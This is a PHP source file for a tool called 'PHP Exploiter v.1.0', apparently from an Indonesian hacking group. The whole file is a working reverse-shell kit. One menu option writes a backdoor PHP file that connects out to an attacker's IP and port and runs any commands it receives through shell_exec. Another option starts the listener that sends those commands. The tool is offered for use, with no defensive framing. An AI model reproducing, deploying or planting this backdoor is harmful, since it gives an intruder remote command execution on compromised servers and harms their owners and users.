<?php
/*
             PHP Exploiter v.1.0
    @Author : 74nc0x
    @Date   : 31/12/2018
    @Github : http://github.com/soracyberteam
    
    Copyright (c) 2019 Sora Cyber Team
    
    Note : Recode? Cantumkan nama author/copyright hargai pembuat :)
           Ganti copyright gabikin kamu jadi seorang coder.
    
    BUG : Ketika mengexecute command yang salah / command dengan output banyak ( dapat diatasi dengan ketik tanda titik) , tidak dapat menerima pesan dari target dan harus mengulangi listener.
*/
error_reporting(0);
function listen($ip,$portz){
$host = "$ip";
$port = $portz;
echo "[*] Listening on $host:$port ... \n";
$socket=socket_create(AF_INET, SOCK_STREAM, 0);
socket_bind($socket, $host, $port);
socket_listen($socket, 3);
$spawn = socket_accept($socket);
if($spawn){
$date=date("r");
echo "[*] Session Opened At $date\n"; 
commandzz:
echo "exploit > ";
$command=trim(fgets(STDIN));//$cekk=shell_exec($command);
if(!$command){goto commandzz;}
socket_write($spawn, $command, strlen ($command));
if(preg_match('/cd/',$command)){goto commandzz;}
$i=socket_read($spawn,1024);
$z=trim($i);
echo "$z\n";
goto commandzz;
}
}
function generate($ip,$portz,$path){
$fh=fopen("$path",w);
fwrite($fh,'<?php error_reporting(0);$host="'.$ip.'";$port='.$portz.';$socket=socket_create(AF_INET, SOCK_STREAM, 0);socket_connect($socket, $host, $port);session_start();xxx:$cmd=socket_read($socket,1024);if(preg_match("/cd/",$cmd)){$x=explode(" ",$cmd);$dirx=$x[\'1\'];$_SESSION[\'dir\']=$dirx;$dir=$_SESSION[\'dir\'];}else{$dir=getcwd();}chdir($dir);$x=shell_exec("$cmd");/*if($x == FALSE){$x="[-] Unknown Command";}*/socket_write($socket,"$x",strlen("$x"));goto xxx;');
if(fclose($fh)){
echo "[+] Backdoor Generated -> $path\n";
}else{echo "[-] Permission Denied\n";}}
echo " _____ _  _               _____  __      _       _ _   
|___  | || |  _ __   ___ / _ \ \/ /_ __ | | ___ (_) |_ 
   / /| || |_| '_ \ / __| | | \  /| '_ \| |/ _ \| | __|
  / / |__   _| | | | (__| |_| /  \| |_) | | (_) | | |_   v.1.0
 /_/     |_| |_| |_|\___|\___/_/\_\ .__/|_|\___/|_|\__| [Linux | Windows]
                                  |_|
                                       Created by 74nc0x
                                       Copyright (c) 2019 Sora Cyber Team\n";
echo "Main Menu :\n 1) Generate Backdoor\n 2) Start Listener\n 3) Exit.\n\n";
command:
echo "74nc0x > ";
$cmdx=trim(fgets(STDIN));
if($cmdx == "1"){
echo "[?] IP : ";
$ip=trim(fgets(STDIN));
echo "[?] PORT : ";
$port=trim(fgets(STDIN));
echo "[?] PATH (Ex : /sdcard/backdoor.php) : ";
$path=trim(fgets(STDIN));
generate($ip,$port,$path);
goto command;
}elseif($cmdx == "2"){
echo "[?] IP : ";
$ip=trim(fgets(STDIN));
echo "[?] PORT : ";
$port=trim(fgets(STDIN));
listen($ip,$port);
goto command;
}elseif($cmdx == "3"){
exit();
}else{
session_start();
if(preg_match('/cd/',$cmdx)){
$x=explode(" ",$cmdx);
$dirx=$x['1'];
$_SESSION['dir']="$dirx";
}
if($_SESSION['dir']){
$dir=$_SESSION['dir'];
}else{$dir=getcwd();}
chdir($dir);
echo "[*] exec $cmdx\n";
sleep(0.5);
system($cmdx);
goto command;
}
?>

